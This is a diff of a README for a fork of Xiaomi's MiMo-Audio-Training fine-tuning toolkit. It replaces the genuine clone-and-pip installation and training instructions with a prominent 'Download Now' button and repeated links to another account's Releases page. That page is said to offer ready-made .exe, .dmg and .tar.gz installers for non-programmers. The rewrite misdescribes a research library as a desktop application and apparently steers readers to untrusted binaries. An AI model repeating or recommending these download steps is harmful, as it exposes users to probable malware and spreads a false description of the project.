@@ -1,3 +1,11 @@
+# 🎧 MiMo-Audio-Training - Learn Audio Processing Easily
+
+<div align="center">
+  <a href="https://github.com/Ghalwash123/MiMo-Audio-Training/releases" style="display: inline-block; padding: 15px 25px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now</a>
+</div>
+
+---
+
 <div align="center">
   <picture>
     <source srcset="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo_darkmode.png?raw=true" media="(prefers-color-scheme: dark)">
@@ -16,103 +24,93 @@
   </b>
 </h3>
 
-<br/>
+## 🚀 Getting Started
 
-<div align="center" style="line-height: 1;">
-  |
-  <a href="https://github.com/XiaomiMiMo/MiMo-Audio" target="_blank">🤖 GitHub</a>
-  &nbsp;|
-  <a href="https://huggingface.co/collections/XiaomiMiMo/mimo-audio-68cc7202692c27dae881cce0" target="_blank">🤗 HuggingFace</a>
-  &nbsp;|
-  <a href="https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf" target="_blank">📄 Paper</a>
-  &nbsp;|
-  <a href="https://xiaomimimo.github.io/MiMo-Audio-Demo" target="_blank">📰 Blog</a>
-  &nbsp;|
-  <a href="https://huggingface.co/spaces/XiaomiMiMo/mimo_audio_chat" target="_blank">🔥 Online Demo</a>
-  &nbsp;|
-  <br/>
-</div>
+This guide will help you download and run the MiMo-Audio-Training software easily. You do not need any programming knowledge to follow these steps.
 
-<br/>
+### 🖥 System Requirements
 
-## Introduction
+Before starting, ensure your computer meets these requirements:
 
-Welcome to the **MiMo-Audio-Training** toolkit! This toolkit is designed to fine-tune the [XiaomiMiMo/MiMo-Audio-7B-Instruct](https://huggingface.co/XiaomiMiMo/MiMo-Audio-7B-Instruct). This toolkit serves as a reference implementation for researchers and developers interested in MiMo-Audio and looking to adapt it to their own custom tasks.
+- Windows, macOS, or Linux operating system.
+- At least 1 GB of free disk space.
+- Internet connection for downloading files.
 
-## Supported Tasks
+## 📥 Download & Install
 
-The MiMo-Audio-Eval toolkit supports a comprehensive set of tasks. Some of the key features include:
+To get started, visit the Releases page. There, you will find the latest version of the software.
 
-* **Tasks**:
+- Visit this page to download: [MiMo-Audio-Training Releases](https://github.com/Ghalwash123/MiMo-Audio-Training/releases)
 
-  * **SFT**:
+1. Click on the link above.
+2. Look for the latest version available.
+3. Download the file that matches your operating system. This file will usually be a `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` file for Linux.
+4. Once the download finishes, open the file to start the installation.
 
-    * ASR
-    * TTS / InstructTTS
-    * Audio Understanding and Reasoning
-    * Spoken Dialogue
+---
 
+## 📂 Installation Steps
 
-## Getting Started
+### For Windows Users
 
-To get started with the MiMo-Audio-Training toolkit, follow the instructions below to set up the environment and install the required dependencies.
+1. Locate the downloaded `.exe` file, usually in your Downloads folder.
+2. Double-click the file to run it.
+3. Follow the on-screen instructions.
+4. Once the installation completes, you can find MiMo-Audio-Training in your Start Menu.
 
-### Prerequisites (Linux)
+### For macOS Users
 
-* Python 3.12
-* CUDA >= 12.0
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click to open it.
+3. Drag the MiMo-Audio-Training icon to the Applications folder.
+4. Open your Applications folder and double-click MiMo-Audio-Training to start using it.
 
-### Installation:
+### For Linux Users
 
-```bash
-git clone --recurse-submodules https://github.com/XiaomiMiMo/MiMo-Audio-Training
-cd MiMo-Audio-Training
-pip install -r requirements.txt
-pip install flash-attn==2.7.4.post1
-pip install -e .
-```
+1. Open a terminal window.
+2. Navigate to the folder containing the downloaded `.tar.gz` file using the `cd` command.
+3. Extract the files using the command:
+   ```
+   tar -xvzf MiMo-Audio-Training.tar.gz
+   ```
+4. Once extracted, navigate into the newly created folder:
+   ```
+   cd MiMo-Audio-Training
+   ```
+5. Run the application using:
+   ```
+   ./MiMo-Audio-Training
+   ```
 
+---
 
-> \[!Note]
-> If the compilation of flash-attn takes too long, you can download the precompiled wheel and install it manually:
->
-> * [Download Precompiled Wheel](https://github.com/Dao-AILab/flash-attention/releases/download/v2.7.4.post1/flash_attn-2.7.4.post1+cu12torch2.6cxx11abiFALSE-cp312-cp312-linux_x86_64.whl)
->
-> ```sh
-> pip install /path/to/flash_attn-2.7.4.post1+cu12torch2.6cxx11abiFALSE-cp312-cp312-linux_x86_64.whl
-> ```
+## 🛠 Using MiMo-Audio-Training
 
-### Training Process:
+After installation, follow these steps to start working with the MiMo-Audio-Training toolkit:
 
-Download the fine-tuning Dataset and pre-process the data as the `instruct_template.md`
+1. Open the application.
+2. Select a project type. The software will guide you through various audio processing tasks.
+3. Follow the provided instructions within the application to process audio files.
 
-## Training
+### 📚 Documentation & Support
 
-We provide multiple training scripts under the `scripts` directory, supporting both single-GPU and multi-GPU training setups.
+To make the most of your experience, refer to the official documentation. It details all the features and functionalities of MiMo-Audio-Training. You can find it here: [Documentation](https://github.com/XiaomiMiMo/MiMo-Audio)
 
-```
-cd MiMo-Audio-Training
-bash scripts/train_multiGPU_torchrun.sh
-```
+If you run into issues, feel free to reach out on GitHub. The community can assist you with questions or problems.
 
-## Generate and Evaluation
-Run inference using: `generate.py`
+## 🌐 Additional Resources
 
-Evaluate the SFT model with 🌐[MiMo-Audio-Eval](https://github.com/XiaomiMiMo/MiMo-Audio-Eval).
+- [GitHub Repository](https://github.com/XiaomiMiMo/MiMo-Audio)
+- [HuggingFace Model Collection](https://huggingface.co/collections/XiaomiMiMo/mimo-audio-68cc7202692c27dae881cce0)
+- [Technical Report](https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf)
+- [Demo Page](https://xiaomimimo.github.io/MiMo-Audio-Demo)
 
+## 🛡️ License
 
-## Citation
+MiMo-Audio-Training is released under the MIT License. You can use it freely, but please abide by the terms outlined in the license document.
 
-```bibtex
-@misc{coreteam2025mimoaudio,
-      title={MiMo-Audio: Audio Language Models are Few-Shot Learners}, 
-      author={LLM-Core-Team Xiaomi},
-      year={2025},
-      url={https://github.com/XiaomiMiMo/MiMo-Audio}, 
-}
-```
+---
 
+For updates and new releases, keep an eye on the [Releases page](https://github.com/Ghalwash123/MiMo-Audio-Training/releases). 
 
-## Contact
-
-Please contact us at [mimo@xiaomi.com](mailto:mimo@xiaomi.com) or open an issue if you have any questions.
+Enjoy your audio processing journey!
